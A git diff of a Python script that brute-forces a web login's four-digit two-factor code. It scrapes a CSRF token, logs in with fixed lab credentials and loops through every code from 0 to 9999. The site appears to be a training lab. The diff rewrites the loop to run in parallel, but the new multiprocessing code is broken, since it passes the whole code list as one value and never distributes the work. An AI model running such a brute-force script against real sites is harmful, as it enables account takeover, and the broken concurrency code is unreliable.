@@ -2,18 +2,33 @@ import sys
 import requests
 from bs4 import BeautifulSoup
 import multiprocessing
+# import numpy as np
 
 
 def Check_Second_Factor_Code(code_to_check):
     if code_to_check == 302:
-        print(f'2fa valid with response code {resp.status_code}')
+        print(f'2fa valid with response code {code_to_check}')
         sys.exit(0)
         # Visit account profile page to complete level
     else:
-        print(f'2fa invalid with response code: {resp.status_code}')
+        print(f'2fa invalid with response code: {code_to_check}')
 
 
-def Login_to_account(logindata, factor_code):
+def Login_to_account(site, factor_code):
+
+    s = requests.Session()
+    login_url = f'https://{site}/login'
+
+    resp = s.get(login_url)  # new one each time, otherwise boot
+    soup = BeautifulSoup(resp.text, 'html.parser')
+    csrf = soup.find('input', {'name': 'csrf'}).get('value')
+
+    logindata = {
+        'csrf': csrf,
+        'username': 'carlos',
+        'password': 'montoya'
+    }
+    print(f'Logging in as carlos:montoya')
     resp = s.post(login_url, data=logindata)
     print(f'Login response: {resp.text}')
 
@@ -35,18 +50,11 @@ if __name__ == '__main__':
     if 'https://' in site:
         site = site.rstrip('/').lstrip('https://')
 
-    s = requests.Session()
-    login_url = f'https://{site}/login'
-    for factor_code in range(9999):
-        print(f'\n{factor_code}\n')
-        resp = s.get(login_url)  # new one each time, otherwise boot
-        soup = BeautifulSoup(resp.text, 'html.parser')
-        csrf = soup.find('input', {'name': 'csrf'}).get('value')
-
-        logindata = {
-            'csrf': csrf,
-            'username': 'carlos',
-            'password': 'montoya'
-        }
-        print(f'Logging in as carlos:montoya')
-        Login_to_account(logindata, factor_code)
+    # Generate a list of 0-9999
+    factor_code_list = list(range(0, 10000))
+    # Get a multiple of CPU Count going of workers, in my case 96
+    workers = multiprocessing.cpu_count() * 4
+    # workers = np.array_split(factor_code_list, workers)
+    # print(workers)
+    with multiprocessing.pool(workers) as w:
+        Login_to_account(site, factor_code_list)
